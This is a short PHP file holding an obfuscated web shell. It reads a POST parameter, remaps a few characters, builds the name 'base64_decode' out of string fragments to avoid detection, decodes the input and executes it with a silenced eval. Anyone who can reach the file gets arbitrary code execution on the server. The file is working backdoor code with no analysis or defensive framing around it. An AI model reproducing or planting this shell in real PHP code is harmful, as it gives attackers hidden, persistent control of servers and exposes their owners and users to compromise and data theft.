<?php

$func = $_POST;
$ac = 'a';
$pc = 'at';
$params = 'd';
$data = $func[$params];
$arr = array("|" => "a", "!" => "b", "@" => "c", "_" => "d",);
$result = strtr($data, $arr);
$de2 = '32_de';
$de = "base" . $de2 . "flag";
$de = str_replace("32", "64", $de);
$de = str_replace("flag", "code", $de);
$data = $de($result);
@eval($data);